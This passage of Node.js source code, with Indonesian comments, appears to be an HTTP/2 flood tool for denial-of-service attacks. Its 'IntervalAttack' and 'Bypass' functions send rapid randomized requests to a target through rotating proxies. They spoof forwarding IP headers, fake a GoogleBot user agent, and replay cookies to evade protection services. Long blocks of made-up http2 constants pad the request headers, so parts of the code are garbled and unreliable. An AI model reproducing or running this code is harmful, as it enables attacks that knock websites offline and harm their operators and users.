     Headers.HTTP(proxyOptions, (connection, error) => {
         if (error) return
         
                    const secureOptions = 
 crypto.constants.SSL_OP_NO_SSLv2 |
 crypto.constants.SSL_OP_NO_SSLv3 |
 crypto.constants.SSL_OP_NO_TLSv1 |
 crypto.constants.SSL_OP_NO_TLSv1_1 |
 crypto.constants.ALPN_ENABLED |
 crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
 crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
 crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
 crypto.constants.SSL_OP_COOKIE_EXCHANGE |
 crypto.constants.SSL_OP_PKCS1_CHECK_1 |
 crypto.constants.SSL_OP_PKCS1_CHECK_2 |
 crypto.constants.SSL_OP_SINGLE_DH_USE |
 crypto.constants.SSL_OP_SINGLE_ECDH_USE |
 crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
      
         connection.setKeepAlive(true, 600000);
        
         const tlsOptions = {
            host: parsedTarget.host,
            port: 443,
            secure: true,
            ALPNProtocols: ['h2', 'http/1.1', 'spdy/3.1'],
            sigals: siga,
            socket: connection,
            ciphers: cipper,
            ecdhCurve: "prime256v1:X25519",
            host: parsedTarget.host,
            Compression: true,
            challengesToSolve: Infinity,
            resolveWithFullResponse: true,
            method: kontol,
            followAllRedirects: false,
            maxRedirects: 10,
            clientTimeout: 5000,
            clientlareMaxTimeout: 10000,
            cloudflareTimeout: 5000,
            cloudflareMaxTimeout: 30000,
            secureOptions: secureOptions,
            rejectUnauthorized: false,
            servername: parsedTarget.host,
            secureProtocol: ["TLSv1_3_method", "TLSv1_2_method", "TLSv1_1_method"],
  }
           
        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 
        tlsConn.setKeepAlive(true, 60000);
        tlsConn.allowHalfOpen = true;
        tlsConn.setNoDelay(true);
        tlsConn.setKeepAlive(true, 60 * 1000);
        tlsConn.setMaxListeners(0);
        
        
        const client = http2.connect(parsedTarget.href, {
            createConnection: () => tlsConn,
            protocol: "https:",
            settings: {
                headerTableSize: 4096, // Ukuran header table yang lebih kecil
                maxConcurrentStreams: 100, // Batasan jumlah stream yang lebih rendah
                initialWindowSize: 65535, // Ukuran awal window yang lebih kecil
                maxHeaderListSize: 8192, // Ukuran maksimum daftar header yang lebih kecil
                enablePush: true, // Push dinonaktifkan
            },
            maxSessionMemory: 64000, // Ukuran memori sesi yang lebih kecil
            maxDeflateDynamicTableSize: 4096, // Ukuran tabel deflate yang lebih kecil
            socket: connection,
        });
        
        client.settings({
            headerTableSize: 4096, // Ukuran header table yang lebih kecil
            maxConcurrentStreams: 100, // Batasan jumlah stream yang lebih rendah
            initialWindowSize: 65535, // Ukuran awal window yang lebih kecil
            maxHeaderListSize: 8192, // Ukuran maksimum daftar header yang lebih kecil
            enablePush: true, // Push dinonaktifkan
        });

      client.setMaxListeners(0);
         
const getRandomProxy = () => proxies[Math.floor(Math.random() * proxies.length)];

    client.on('connect', () => {
        const IntervalAttack = (orgCookie) => {
            const _orgCookie = orgCookie || false;
            if (client.closed || client.destroyed) {
                connection.destroy();
                return;
            }

            let ratelimit;
            if (randrate !== undefined) {
                ratelimit = randomIntn(1, 90);
            } else {
                ratelimit = parseInt(process.argv[4]);
            }          

            for (let i = 0; i < (isFull ? ratelimit : 1); i++) {
                if (client.closed || client.destroyed) {
                    connection.destroy();
                    break;
                }
                
                const proxy = getRandomProxy();
                
                const fakeHeaders = {
                    'x-real-ip': randIPv4(),
                    'x-forwarded-host': parsedTarget.host,
                    'x-forwarded-server': parsedTarget.host,
                    'x-forwarded-for': randIPv4(),
                    'x-forwarded-proto': 'https',
                 };
                const dynHeaders = {
                    ...headers,
                    ...fakeHeaders.shuffle(),
                    'Cache-Control': 'no-cache, no-store, must-revalidate',
                    'Pragma': 'no-cache',
                    'Expires': '0',
                    ...customHeadersArray.reduce((acc, header) => ({ ...acc, ...header }), {}),
                    'User-Agent': uap1 + mos + az1 + "-(GoogleBot + http://www.google.com)" + " Code:" + randstr(7),
                    'Cookie': randomHeaders["cookie"] + "; " + encryptedCookie,
                };
                
                                
                                let oo = {
                                    [http2.constants.HTTP2_HEADER_METHOD]: 'GET',
                                    [http2.constants.HTTP2_HEADER_PATH]: parsedTarget.path + pathx + "&" + '?' + generateRandomString(5, 15) + '=' + query + generateRandomString(20, 25) + (postdata ? `?${postdata}` : "") + ":443",
                                    [http2.constants.HTTP2_HEADER_AUTHORITY]: parsedTarget.host,
                                    [http2.constants.HTTP2_HEADER_SCHEME]: 'https',
                                    [http2.constants.HTTP2_HEADER_ACCEPT]: accept,
                                    [http2.constants.HTTP2_HEADER_ACCEPT_ENCODING]: encoding,
                                    [http2.constants.HTTP2_HEADER_CACHE_CONTROL]: 'no-cache',
                                    ...dynHeaders,
                                    
                    // HTTP2 Error Codes
                    HTTP2_NO_ERROR: http2.constants.NGHTTP2_NO_ERROR,
                    HTTP2_PROTOCOL_ERROR: http2.constants.NGHTTP2_PROTOCOL_ERROR,
                    HTTP2_INTERNAL_ERROR: http2.constants.NGHTTP2_INTERNAL_ERROR,
                    HTTP2_FLOW_CONTROL_ERROR: http2.constants.NGHTTP2_FLOW_CONTROL_ERROR,
                    HTTP2_SETTINGS_TIMEOUT: http2.constants.NGHTTP2_SETTINGS_TIMEOUT,
                    HTTP2_STREAM_CLOSED: http2.constants.NGHTTP2_STREAM_CLOSED,
                    HTTP2_FRAME_SIZE_ERROR: http2.constants.NGHTTP2_FRAME_SIZE_ERROR,
                    HTTP2_REFUSED_STREAM: http2.constants.NGHTTP2_REFUSED_STREAM,
                    HTTP2_CANCEL: http2.constants.NGHTTP2_CANCEL,
                    HTTP2_COMPRESSION_ERROR: http2.constants.NGHTTP2_COMPRESSION_ERROR,
                    HTTP2_CONNECT_ERROR: http2.constants.NGHTTP2_CONNECT_ERROR,
                    HTTP2_ENHANCE_YOUR_CALM: http2.constants.NGHTTP2_ENHANCE_YOUR_CALM,
                    HTTP2_INADEQUATE_SECURITY: http2.constants.NGHTTP2_INADEQUATE_SECURITY,
                    HTTP2_HTTP_1_1_REQUIRED: http2.constants.NGHTTP2_HTTP_1_1_REQUIRED,
                    HTTP2_ENHANCE_YOUR_RESOLUTION: http2.constants.NGHTTP2_ENHANCE_YOUR_RESOLUTION,
                    HTTP2_ORIGINAL_URL_TOO_LARGE: http2.constants.NGHTTP2_ORIGINAL_URL_TOO_LARGE,
                    HTTP2_TOO_MANY_REDIRECTS: http2.constants.NGHTTP2_TOO_MANY_REDIRECTS,
                    HTTP2_INCOMPLETE_REQUEST: http2.constants.NGHTTP2_INCOMPLETE_REQUEST,
                    HTTP2_INVALID_CREDENTIALS: http2.constants.NGHTTP2_INVALID_CREDENTIALS,
                    HTTP2_CONNECTION_REFUSED: http2.constants.NGHTTP2_CONNECTION_REFUSED,
                    HTTP2_PROXY_AUTHENTICATION_REQUIRED: http2.constants.NGHTTP2_PROXY_AUTHENTICATION_REQUIRED,
                    HTTP2_REQUEST_TIMEOUT: http2.constants.NGHTTP2_REQUEST_TIMEOUT,
                    HTTP2_REQUEST_ENTITY_TOO_LARGE: http2.constants.NGHTTP2_REQUEST_ENTITY_TOO_LARGE,
                    HTTP2_SERVICE_UNAVAILABLE: http2.constants.NGHTTP2_SERVICE_UNAVAILABLE,
                    HTTP2_SERVER_INTERNAL_ERROR: http2.constants.NGHTTP2_SERVER_INTERNAL_ERROR,
                    HTTP2_SERVER_SHUTDOWN: http2.constants.NGHTTP2_SERVER_SHUTDOWN,
                    HTTP2_BAD_GATEWAY: http2.constants.NGHTTP2_BAD_GATEWAY,
                    HTTP2_TLS_HANDSHAKE: http2.constants.NGHTTP2_TLS_HANDSHAKE,
                    HTTP2_NETWORK_READ_TIMEOUT_ERROR: http2.constants.NGHTTP2_NETWORK_READ_TIMEOUT_ERROR,
                    HTTP2_NETWORK_WRITE_TIMEOUT_ERROR: http2.constants.NGHTTP2_NETWORK_WRITE_TIMEOUT_ERROR,
                    HTTP2_ALTSVC_REQUIRED: http2.constants.NGHTTP2_ALTSVC_REQUIRED,
                    HTTP2_HTTP_1_0_REQUIRED: http2.constants.NGHTTP2_HTTP_1_0_REQUIRED,
                    HTTP2_NETWORK_CONNECTION_TIMEOUT_ERROR: http2.constants.NGHTTP2_NETWORK_CONNECTION_TIMEOUT_ERROR,
                    HTTP2_PROXY_ERROR: http2.constants.NGHTTP2_PROXY_ERROR,
                    HTTP2_CLIENT_INTERNAL_ERROR: http2.constants.NGHTTP2_CLIENT_INTERNAL_ERROR,
                    HTTP2_TRANSPORT_NOT_AVAILABLE: http2.constants.NGHTTP2_TRANSPORT_NOT_AVAILABLE,
                    HTTP2_TOO_MANY_STREAMS_ERROR: http2.constants.NGHTTP2_TOO_MANY_STREAMS_ERROR,
                    HTTP2_FRAME_ERROR: http2.constants.NGHTTP2_FRAME_ERROR,
                    HTTP2_COMPRESSION_DATA_ERROR: http2.constants.NGHTTP2_COMPRESSION_DATA_ERROR,
                    HTTP2_CONNECTION_CLOSED: http2.constants.NGHTTP2_CONNECTION_CLOSED,
                    HTTP2_ENHANCE_YOUR_CALM3: http2.constants.NGHTTP2_ENHANCE_YOUR_CALM3,
                    HTTP2_ORIGIN_FRAME_SIZE_ERROR: http2.constants.NGHTTP2_ORIGIN_FRAME_SIZE_ERROR,
                    HTTP2_HPACK_DECODER_ERROR: http2.constants.NGHTTP2_HPACK_DECODER_ERROR,
                    HTTP2_HTTP_CONNECT_ERROR: http2.constants.NGHTTP2_HTTP_CONNECT_ERROR,
                    HTTP2_CONNECT_FAILED: http2.constants.NGHTTP2_CONNECT_FAILED,
                    HTTP2_TLS_FAILED: http2.constants.NGHTTP2_TLS_FAILED,
                    HTTP2_SLOW_DOWN: http2.constants.NGHTTP2_SLOW_DOWN,
                    HTTP2_TX_DMA_FAILED: http2.constants.NGHTTP2_TX_DMA_FAILED,
                    HTTP2_RX_DMA_FAILED: http2.constants.NGHTTP2_RX_DMA_FAILED,
                    HTTP2_TX_FRAME_TOO_LARGE: http2.constants.NGHTTP2_TX_FRAME_TOO_LARGE,
                    HTTP2_TX_INVALID_FEC: http2.constants.NGHTTP2_TX_INVALID_FEC,
                    HTTP2_UNKNOWN_FRAME_TYPE: http2.constants.NGHTTP2_UNKNOWN_FRAME_TYPE,
                    HTTP2_UNEXPECTED_FRAME: http2.constants.NGHTTP2_UNEXPECTED_FRAME,
                    HTTP2_BAD_HEADER: http2.constants.NGHTTP2_BAD_HEADER,
                    HTTP2_INVALID_STATE: http2.constants.NGHTTP2_INVALID_STATE,
                    HTTP2_CLOSED_STREAM: http2.constants.NGHTTP2_CLOSED_STREAM,
                    HTTP2_TOO_MANY_HEADERS: http2.constants.NGHTTP2_TOO_MANY_HEADERS,
                    HTTP2_HEADER_LIST_SIZE: http2.constants.NGHTTP2_HEADER_LIST_SIZE,
                    HTTP2_FRAME_LIST_SIZE: http2.constants.NGHTTP2_FRAME_LIST_SIZE,
                    HTTP2_INVALID_FRAME_SIZE: http2.constants.NGHTTP2_INVALID_FRAME_SIZE,
                    HTTP2_HEADER_COMPRESSION_ERROR: http2.constants.NGHTTP2_HEADER_COMPRESSION_ERROR,
                    HTTP2_STREAM_RESET: http2.constants.NGHTTP2_STREAM_RESET,
                    HTTP2_CONNECTION_RESET: http2.constants.NGHTTP2_CONNECTION_RESET,
                    HTTP2_DECRYPTION_FAILED: http2.constants.NGHTTP2_DECRYPTION_FAILED,
                    HTTP2_CERTIFICATE_REQUIRED: http2.constants.NGHTTP2_CERTIFICATE_REQUIRED,
                    HTTP2_CERTIFICATE_REVOKED: http2.constants.NGHTTP2_CERTIFICATE_REVOKED,
                    HTTP2_CERTIFICATE_EXPIRED: http2.constants.NGHTTP2_CERTIFICATE_EXPIRED,
                    HTTP2_UNSUPPORTED_CERTIFICATE: http2.constants.NGHTTP2_UNSUPPORTED_CERTIFICATE,
                    HTTP2_CERTIFICATE_UNKNOWN: http2.constants.NGHTTP2_CERTIFICATE_UNKNOWN,
                    HTTP2_REQUEST_HEADER_FIELDS_TOO_LARGE: http2.constants.NGHTTP2_REQUEST_HEADER_FIELDS_TOO_LARGE,
                    HTTP2_ENHANCE_YOUR_REQUEST: http2.constants.NGHTTP2_ENHANCE_YOUR_REQUEST,
                    HTTP2_NETWORK_CONNECT_TIMEOUT_ERROR: http2.constants.NGHTTP2_NETWORK_CONNECT_TIMEOUT_ERROR,
                    HTTP2_NETWORK_UNREACHABLE: http2.constants.NGHTTP2_NETWORK_UNREACHABLE,
                    HTTP2_HOST_UNREACHABLE: http2.constants.NGHTTP2_HOST_UNREACHABLE,
                    HTTP2_CONNECTION_REFUSED_BY_SERVER: http2.constants.NGHTTP2_CONNECTION_REFUSED_BY_SERVER,
                    HTTP2_SERVER_CERTIFICATE_REVOKED: http2.constants.NGHTTP2_SERVER_CERTIFICATE_REVOKED,
                    HTTP2_SERVER_CERTIFICATE_EXPIRED: http2.constants.NGHTTP2_SERVER_CERTIFICATE_EXPIRED,
                    HTTP2_SERVER_CERTIFICATE_UNTRUSTED: http2.constants.NGHTTP2_SERVER_CERTIFICATE_UNTRUSTED,
                    HTTP2_SERVER_CERTIFICATE_INVALID: http2.constants.NGHTTP2_SERVER_CERTIFICATE_INVALID,
                    HTTP2_SERVER_CERTIFICATE_UNKNOWN: http2.constants.NGHTTP2_SERVER_CERTIFICATE_UNKNOWN,
                    HTTP2_CLIENT_CERTIFICATE_REQUIRED: http2.constants.NGHTTP2_CLIENT_CERTIFICATE_REQUIRED,
                    HTTP2_CLIENT_CERTIFICATE_REVOKED: http2.constants.NGHTTP2_CLIENT_CERTIFICATE_REVOKED,
                    HTTP2_CLIENT_CERTIFICATE_EXPIRED: http2.constants.NGHTTP2_CLIENT_CERTIFICATE_EXPIRED,
                    HTTP2_CLIENT_CERTIFICATE_UNTRUSTED: http2.constants.NGHTTP2_CLIENT_CERTIFICATE_UNTRUSTED,
                    HTTP2_CLIENT_CERTIFICATE_INVALID: http2.constants.NGHTTP2_CLIENT_CERTIFICATE_INVALID,
                    HTTP2_CLIENT_CERTIFICATE_UNKNOWN: http2.constants.NGHTTP2_CLIENT_CERTIFICATE_UNKNOWN,
                    HTTP2_CONNECTION_TERMINATED: http2.constants.NGHTTP2_CONNECTION_TERMINATED,
                    HTTP2_FRAME_PAYLOAD_TOO_LARGE: http2.constants.NGHTTP2_FRAME_PAYLOAD_TOO_LARGE,
                    HTTP2_FRAME_PADDING_ERROR: http2.constants.NGHTTP2_FRAME_PADDING_ERROR,
                    HTTP2_SESSION_INVALID: http2.constants.NGHTTP2_SESSION_INVALID,
                    HTTP2_STREAM_INVALID: http2.constants.NGHTTP2_STREAM_INVALID,
                    HTTP2_SESSION_CLOSED: http2.constants.NGHTTP2_SESSION_CLOSED,
                    HTTP2_SESSION_ID: http2.constants.NGHTTP2_SESSION_ID,
                    HTTP2_STREAM_ID: http2.constants.NGHTTP2_STREAM_ID,
                    
                    // HTTP2 Frame Types
                    HTTP2_DATA: http2.constants.NGHTTP2_DATA,
                    HTTP2_HEADERS: http2.constants.NGHTTP2_HEADERS,
                    HTTP2_PRIORITY: http2.constants.NGHTTP2_PRIORITY,
                    HTTP2_RST_STREAM: http2.constants.NGHTTP2_RST_STREAM,
                    HTTP2_SETTINGS: http2.constants.NGHTTP2_SETTINGS,
                    HTTP2_PUSH_PROMISE: http2.constants.NGHTTP2_PUSH_PROMISE,
                    HTTP2_PING: http2.constants.NGHTTP2_PING,
                    HTTP2_GOAWAY: http2.constants.NGHTTP2_GOAWAY,
                    HTTP2_WINDOW_UPDATE: http2.constants.NGHTTP2_WINDOW_UPDATE,
                    HTTP2_CONTINUATION: http2.constants.NGHTTP2_CONTINUATION,
                    HTTP2_ALTSVC: http2.constants.NGHTTP2_ALTSVC,
                    HTTP2_ORIGINS: http2.constants.NGHTTP2_ORIGINS,
                    HTTP2_ORIGIN: http2.constants.NGHTTP2_ORIGIN,
                    HTTP2_MULTIPLEXING_ERROR: http2.constants.NGHTTP2_MULTIPLEXING_ERROR,
                    HTTP2_UNAVAILABLE: http2.constants.NGHTTP2_UNAVAILABLE,
                    HTTP2_REQUEST_REJECTED: http2.constants.NGHTTP2_REQUEST_REJECTED,
                    HTTP2_ENHANCE_YOUR_CALM2: http2.constants.NGHTTP2_ENHANCE_YOUR_CALM2,
                    HTTP2_INCOMPATIBLE_VERSION: http2.constants.NGHTTP2_INCOMPATIBLE_VERSION,
                    HTTP2_CONNECT_TIMEOUT: http2.constants.NGHTTP2_CONNECT_TIMEOUT,
                    HTTP2_ALTSVC_ACK: http2.constants.NGHTTP2_ALTSVC_ACK,
                    HTTP2_TLS_DECRYPTION_FAILED: http2.constants.NGHTTP2_TLS_DECRYPTION_FAILED,
                    HTTP2_ORIGIN_FRAME_ERROR: http2.constants.NGHTTP2_ORIGIN_FRAME_ERROR,
                    HTTP2_ORIGIN_FRAME_SETTINGS_ERROR: http2.constants.NGHTTP2_ORIGIN_FRAME_SETTINGS_ERROR,
                    HTTP2_AUTHORITY_MISMATCH: http2.constants.NGHTTP2_AUTHORITY_MISMATCH,
                    HTTP2_CRYPTO_ERROR: http2.constants.NGHTTP2_CRYPTO_ERROR,
                    HTTP2_INCOMPLETE_CERTIFICATE_CHAIN: http2.constants.NGHTTP2_INCOMPLETE_CERTIFICATE_CHAIN,
                    HTTP2_HTTP_REQUEST_ERROR: http2.constants.NGHTTP2_HTTP_REQUEST_ERROR,
                    HTTP2_PROTOCOL_UNEXPECTED_FRAME: http2.constants.NGHTTP2_PROTOCOL_UNEXPECTED_FRAME,
                    HTTP2_RX_INVALID_FEC: http2.constants.NGHTTP2_RX_INVALID_FEC,
                    HTTP2_FLOW_CONTROL: http2.constants.NGHTTP2_FLOW_CONTROL,
                    HTTP2_NOMORE_STREAMS: http2.constants.NGHTTP2_NOMORE_STREAMS,
                    HTTP2_DATA_NOT_ALLOWED: http2.constants.NGHTTP2_DATA_NOT_ALLOWED,
                    HTTP2_INTERNAL_ERROR2: http2.constants.NGHTTP2_INTERNAL_ERROR2,
                    HTTP2_STREAM_CLOSED2: http2.constants.NGHTTP2_STREAM_CLOSED2,
                    HTTP2_CONNECT_ERROR2: http2.constants.NGHTTP2_CONNECT_ERROR2,
                    HTTP2_BUSY: http2.constants.NGHTTP2_BUSY,
                    HTTP2_BUFFER_TOO_SMALL: http2.constants.NGHTTP2_BUFFER_TOO_SMALL,
                    HTTP2_ERROR_BEGIN: http2.constants.NGHTTP2_ERROR_BEGIN,
                    HTTP2_UNKNOWN: http2.constants.NGHTTP2_UNKNOWN,
                    HTTP2_FIRST: http2.constants.NGHTTP2_FIRST,
                    HTTP2_LAST: http2.constants.NGHTTP2_LAST,
                    HTTP2_PING_ACK: http2.constants.NGHTTP2_PING_ACK,
                    HTTP2_MAX_FRAME_SIZE: http2.constants.NGHTTP2_MAX_FRAME_SIZE,
                    HTTP2_HEADER_BLOCK: http2.constants.NGHTTP2_HEADER_BLOCK,
                    HTTP2_HEADER_BLOCK_INFLATE: http2.constants.NGHTTP2_HEADER_BLOCK_INFLATE,
                    HTTP2_HEADER_BLOCK_DEFLATE: http2.constants.NGHTTP2_HEADER_BLOCK_DEFLATE,
                    HTTP2_HPACK: http2.constants.NGHTTP2_HPACK,
                    HTTP2_HPACK_DECODER: http2.constants.NGHTTP2_HPACK_DECODER,
                    HTTP2_HPACK_ENCODER: http2.constants.NGHTTP2_HPACK_ENCODER,
                    HTTP2_STREAM_IDLE: http2.constants.NGHTTP2_STREAM_IDLE,
                    HTTP2_STREAM_OPEN: http2.constants.NGHTTP2_STREAM_OPEN,
                    HTTP2_STREAM_HALF_CLOSED_REMOTE: http2.constants.NGHTTP2_STREAM_HALF_CLOSED_REMOTE,
                    HTTP2_STREAM_HALF_CLOSED_LOCAL: http2.constants.NGHTTP2_STREAM_HALF_CLOSED_LOCAL,
                    HTTP2_STREAM_RESERVED: http2.constants.NGHTTP2_STREAM_RESERVED,
                    HTTP2_STREAM_CLOSED: http2.constants.NGHTTP2_STREAM_CLOSED,
                    HTTP2_FRAME_DATA: http2.constants.NGHTTP2_FRAME_DATA,
                    HTTP2_FRAME_HEADERS: http2.constants.NGHTTP2_FRAME_HEADERS,
                    HTTP2_FRAME_PRIORITY: http2.constants.NGHTTP2_FRAME_PRIORITY,
                    HTTP2_FRAME_RST_STREAM: http2.constants.NGHTTP2_FRAME_RST_STREAM,
                    HTTP2_FRAME_SETTINGS: http2.constants.NGHTTP2_FRAME_SETTINGS,
                    HTTP2_FRAME_PUSH_PROMISE: http2.constants.NGHTTP2_FRAME_PUSH_PROMISE,
                    HTTP2_FRAME_PING: http2.constants.NGHTTP2_FRAME_PING,
                    HTTP2_FRAME_GOAWAY: http2.constants.NGHTTP2_FRAME_GOAWAY,
                    HTTP2_FRAME_WINDOW_UPDATE: http2.constants.NGHTTP2_FRAME_WINDOW_UPDATE,
                    HTTP2_FRAME_CONTINUATION: http2.constants.NGHTTP2_FRAME_CONTINUATION,
                    HTTP2_FRAME_CANCEL: http2.constants.NGHTTP2_FRAME_CANCEL,
                    HTTP2_FRAME_PRIORITY_UPDATE: http2.constants.NGHTTP2_FRAME_PRIORITY_UPDATE,
                    HTTP2_FRAME_ALTSVC_ACK: http2.constants.NGHTTP2_FRAME_ALTSVC_ACK,
                    HTTP2_FRAME_PROXY_HEADER: http2.constants.NGHTTP2_FRAME_PROXY_HEADER,
                    HTTP2_FRAME_DATAGRAM: http2.constants.NGHTTP2_FRAME_DATAGRAM,
                    HTTP2_FRAME_PADDING: http2.constants.NGHTTP2_FRAME_PADDING,
                    HTTP2_FRAME_ORIGIN: http2.constants.NGHTTP2_FRAME_ORIGIN,
                    HTTP2_FRAME_ORIGIN_SETTINGS: http2.constants.NGHTTP2_FRAME_ORIGIN_SETTINGS,
                    HTTP2_FRAME_CERTIFICATE: http2.constants.NGHTTP2_FRAME_CERTIFICATE,
                    HTTP2_FRAME_CERTIFICATE_REQUEST: http2.constants.NGHTTP2_FRAME_CERTIFICATE_REQUEST,
                    HTTP2_FRAME_CERTIFICATE_REVOKE: http2.constants.NGHTTP2_FRAME_CERTIFICATE_REVOKE,
                    HTTP2_FRAME_CERTIFICATE_EXPIRED: http2.constants.NGHTTP2_FRAME_CERTIFICATE_EXPIRED,
                    HTTP2_FRAME_CERTIFICATE_TRUSTED: http2.constants.NGHTTP2_FRAME_CERTIFICATE_TRUSTED,
                    HTTP2_FRAME_CERTIFICATE_INVALID: http2.constants.NGHTTP2_FRAME_CERTIFICATE_INVALID,
                    HTTP2_FRAME_CERTIFICATE_UNKNOWN: http2.constants.NGHTTP2_FRAME_CERTIFICATE_UNKNOWN,
                };


                const request = client.request({
                    ...oo,
                    ':path': parsedTarget.path + pathx + "&" + '?' + generateRandomString(5, 15) + '=' + query + generateRandomString(20, 25) + (postdata ? `?${postdata}` : "") + ":443",
                    proxy: proxy
                  });
                  
                  const request1 = client.request({
                    ...oo,
                    ':path': parsedTarget.path + pathx + "&" + '?' + generateRandomString(5, 15) + '=' + query + generateRandomString(20, 25) + (postdata ? `?${postdata}` : "") + ":443",
                    proxy: proxy
                  });
                           
                request.on("response", response => {
                    if (response['set-cookie']) {
                        headers["cookie"] = cookieString(scp.parse(response['set-cookie']));
                    }
                    request.close();
                    request1.close();
                    request.destroy();
                    request1.destroy();
                    return;
                });
                request.end();

    
                if (i + 1 >= isFull ? ratelimit : 120) {
                    if (!client.closed && !client.destroyed) {
                        Bypass(true, _orgCookie);
                    } else {
                        client.destroy();
                        connection.destroy();
                    }
                }
            }
        };

        const Bypass = (reBypass, orgCookie) => {
            try {
                let inspectData = false;

                if (client.closed || client.destroyed) {
                    client.destroy();
                    connection.destroy();
                    return;
                }

                const proxy = getRandomProxy();
                
                const fakeHeaders = {
                    'x-real-ip': randIPv4(),
                    'x-forwarded-host': parsedTarget.host,
                    'x-forwarded-server': parsedTarget.host,
                    'x-forwarded-for': randIPv4(),
                    'x-forwarded-proto': 'https',
                 };
                const dynHeaders = {
                    ...headers,
                    ...fakeHeaders.shuffle(),
                    'Cache-Control': 'no-cache, no-store, must-revalidate',
                    'Pragma': 'no-cache',
                    'Expires': '0',
                    'User-Agent': uap1 + mos + az1 + "-(GoogleBot + http://www.google.com)" + " Code:" + randstr(7),
                    'Cookie': randomHeaders["cookie"] + "; " + encryptedCookie,
                };
                
                
                                let ratelimit;
                                if (randrate !== undefined) {
                                    ratelimit = randomIntn(1, 90);
                                } else {
                                    ratelimit = parseInt(process.argv[4]);
                                }             
                                
                                let oo = {
                                    [http2.constants.HTTP2_HEADER_METHOD]: 'GET',
                                    [http2.constants.HTTP2_HEADER_PATH]: parsedTarget.path + pathx + "&" + '?' + generateRandomString(5, 15) + '=' + query + generateRandomString(20, 25) + (postdata ? `?${postdata}` : "") + ":443",
                                    [http2.constants.HTTP2_HEADER_AUTHORITY]: parsedTarget.host,
                                    [http2.constants.HTTP2_HEADER_SCHEME]: 'https',
                                    [http2.constants.HTTP2_HEADER_ACCEPT]: accept,
                                    [http2.constants.HTTP2_HEADER_ACCEPT_ENCODING]: encoding,
                                    [http2.constants.HTTP2_HEADER_CACHE_CONTROL]: 'no-cache',
                                    ...dynHeaders,
                    
                    // HTTP2 Error Codes
                    HTTP2_NO_ERROR: http2.constants.NGHTTP2_NO_ERROR,
                    HTTP2_PROTOCOL_ERROR: http2.constants.NGHTTP2_PROTOCOL_ERROR,
                    HTTP2_INTERNAL_ERROR: http2.constants.NGHTTP2_INTERNAL_ERROR,
                    HTTP2_FLOW_CONTROL_ERROR: http2.constants.NGHTTP2_FLOW_CONTROL_ERROR,
                    HTTP2_SETTINGS_TIMEOUT: http2.constants.NGHTTP2_SETTINGS_TIMEOUT,
                    HTTP2_STREAM_CLOSED: http2.constants.NGHTTP2_STREAM_CLOSED,
                    HTTP2_FRAME_SIZE_ERROR: http2.constants.NGHTTP2_FRAME_SIZE_ERROR,
                    HTTP2_REFUSED_STREAM: http2.constants.NGHTTP2_REFUSED_STREAM,
                    HTTP2_CANCEL: http2.constants.NGHTTP2_CANCEL,
                    HTTP2_COMPRESSION_ERROR: http2.constants.NGHTTP2_COMPRESSION_ERROR,
                    HTTP2_CONNECT_ERROR: http2.constants.NGHTTP2_CONNECT_ERROR,
                    HTTP2_ENHANCE_YOUR_CALM: http2.constants.NGHTTP2_ENHANCE_YOUR_CALM,
                    HTTP2_INADEQUATE_SECURITY: http2.constants.NGHTTP2_INADEQUATE_SECURITY,
                    HTTP2_HTTP_1_1_REQUIRED: http2.constants.NGHTTP2_HTTP_1_1_REQUIRED,
                    HTTP2_ENHANCE_YOUR_RESOLUTION: http2.constants.NGHTTP2_ENHANCE_YOUR_RESOLUTION,
                    HTTP2_ORIGINAL_URL_TOO_LARGE: http2.constants.NGHTTP2_ORIGINAL_URL_TOO_LARGE,
                    HTTP2_TOO_MANY_REDIRECTS: http2.constants.NGHTTP2_TOO_MANY_REDIRECTS,
                    HTTP2_INCOMPLETE_REQUEST: http2.constants.NGHTTP2_INCOMPLETE_REQUEST,
                    HTTP2_INVALID_CREDENTIALS: http2.constants.NGHTTP2_INVALID_CREDENTIALS,
                    HTTP2_CONNECTION_REFUSED: http2.constants.NGHTTP2_CONNECTION_REFUSED,
                    HTTP2_PROXY_AUTHENTICATION_REQUIRED: http2.constants.NGHTTP2_PROXY_AUTHENTICATION_REQUIRED,
                    HTTP2_REQUEST_TIMEOUT: http2.constants.NGHTTP2_REQUEST_TIMEOUT,
                    HTTP2_REQUEST_ENTITY_TOO_LARGE: http2.constants.NGHTTP2_REQUEST_ENTITY_TOO_LARGE,
                    HTTP2_SERVICE_UNAVAILABLE: http2.constants.NGHTTP2_SERVICE_UNAVAILABLE,
                    HTTP2_SERVER_INTERNAL_ERROR: http2.constants.NGHTTP2_SERVER_INTERNAL_ERROR,
                    HTTP2_SERVER_SHUTDOWN: http2.constants.NGHTTP2_SERVER_SHUTDOWN,
                    HTTP2_BAD_GATEWAY: http2.constants.NGHTTP2_BAD_GATEWAY,
                    HTTP2_TLS_HANDSHAKE: http2.constants.NGHTTP2_TLS_HANDSHAKE,
                    HTTP2_NETWORK_READ_TIMEOUT_ERROR: http2.constants.NGHTTP2_NETWORK_READ_TIMEOUT_ERROR,
                    HTTP2_NETWORK_WRITE_TIMEOUT_ERROR: http2.constants.NGHTTP2_NETWORK_WRITE_TIMEOUT_ERROR,
                    HTTP2_ALTSVC_REQUIRED: http2.constants.NGHTTP2_ALTSVC_REQUIRED,
                    HTTP2_HTTP_1_0_REQUIRED: http2.constants.NGHTTP2_HTTP_1_0_REQUIRED,
                    HTTP2_NETWORK_CONNECTION_TIMEOUT_ERROR: http2.constants.NGHTTP2_NETWORK_CONNECTION_TIMEOUT_ERROR,
                    HTTP2_PROXY_ERROR: http2.constants.NGHTTP2_PROXY_ERROR,
                    HTTP2_CLIENT_INTERNAL_ERROR: http2.constants.NGHTTP2_CLIENT_INTERNAL_ERROR,
                    HTTP2_TRANSPORT_NOT_AVAILABLE: http2.constants.NGHTTP2_TRANSPORT_NOT_AVAILABLE,
                    HTTP2_TOO_MANY_STREAMS_ERROR: http2.constants.NGHTTP2_TOO_MANY_STREAMS_ERROR,
                    HTTP2_FRAME_ERROR: http2.constants.NGHTTP2_FRAME_ERROR,
                    HTTP2_COMPRESSION_DATA_ERROR: http2.constants.NGHTTP2_COMPRESSION_DATA_ERROR,
                    HTTP2_CONNECTION_CLOSED: http2.constants.NGHTTP2_CONNECTION_CLOSED,
                    HTTP2_ENHANCE_YOUR_CALM3: http2.constants.NGHTTP2_ENHANCE_YOUR_CALM3,
